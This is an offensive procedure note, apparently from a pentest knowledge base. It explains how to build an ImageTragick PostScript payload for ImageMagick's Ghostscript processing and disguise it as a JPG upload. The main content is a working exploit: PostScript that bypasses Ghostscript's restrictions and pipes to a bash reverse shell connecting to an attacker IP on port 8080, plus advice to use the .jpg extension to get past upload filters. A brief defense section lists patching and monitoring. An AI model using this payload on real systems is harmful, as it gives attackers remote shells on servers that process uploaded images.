---
tags:
  - payload-creation
  - postscript
  - imagetragick
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/initiate-reverse-shell]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:24:17.732Z'
sub_techniques: []
id: dcd3e6ae-e81c-4ed6-bbf9-80f42762f0b3
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploitation for Client Execution]]'
---
# Craft ImageTragick PostScript Payload

## Summary

This procedure creates a PostScript payload disguised as a JPG file to exploit ImageMagick's Ghostscript integration, embedding a reverse shell command for RCE.

## Description

ImageTragick allows PostScript (PS) files to execute arbitrary commands via Ghostscript when processed by ImageMagick. The payload undefines setpagedevice to bypass restrictions, then sets an OutputFile pipe to bash for a reverse shell. Save as .jpg to evade basic filters. Prerequisites include knowing attacker's IP and port (e.g., 8080).

## Requirements

1. Text editor (e.g., vim, notepad)
2. Attacker's IP address and listener port
3. Basic knowledge of PostScript syntax

## Defense

Defensive measures and detection strategies:

- Patch ImageMagick and configure policy.xml to disable PS/EPS/PDF processing
- Scan uploads for non-image signatures
- Monitor for Ghostscript invocations

## Objectives

1. Embed RCE payload in PS code
2. Disguise as valid image file
3. Ensure compatibility with ImageMagick

## Instructions

### Step 1: Write PostScript Payload

**Context**: Construct the exploit code to trigger Ghostscript.

Create a file with the following content, replacing [IP] with your IP:

**Command** ([[commands/initiate-reverse-shell]]):
```bash
%!PS
userdict /setpagedevice undef
legal { null restore } stopped { pop } if
legal mark
/OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/[IP]/8080 0>&1') currentdevice putdeviceprops
```

> This payload bypasses Ghostscript policies and pipes output to a bash reverse shell.

### Step 2: Save as JPG

**Context**: Disguise the payload.

Save the file as test.jpg.

**Expected Output**: test.jpg file ready for upload.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Exploitation for Client Execution]] Exploitation for Client Execution

### Sub-Techniques


## Commands Used

- [[commands/initiate-reverse-shell]]

## Tools Used


## Tags

- payload-creation
- postscript
- imagetragick
